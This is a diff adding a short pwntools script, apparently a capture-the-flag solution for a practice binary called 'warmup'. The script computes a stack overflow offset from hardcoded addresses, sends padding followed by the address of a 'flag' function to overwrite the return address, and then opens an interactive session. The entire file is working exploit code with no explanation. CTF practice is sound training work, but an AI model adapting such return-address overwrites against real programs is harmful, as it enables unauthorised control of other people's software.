@@ -1,0 +1,18 @@
+from pwn import *
+ret=0x00007FFCEF08F258
+buf=0x00007FFCEF08F216
+flag=0x000000000040060D
+Debug=1
+log_level='debug'
+
+if Debug:
+    io=process('./warmup')
+else:
+    pass
+
+def main():
+    io.sendline((ret-buf+6)*'a'+p64(flag))
+    io.interactive()
+
+pause()
+main()
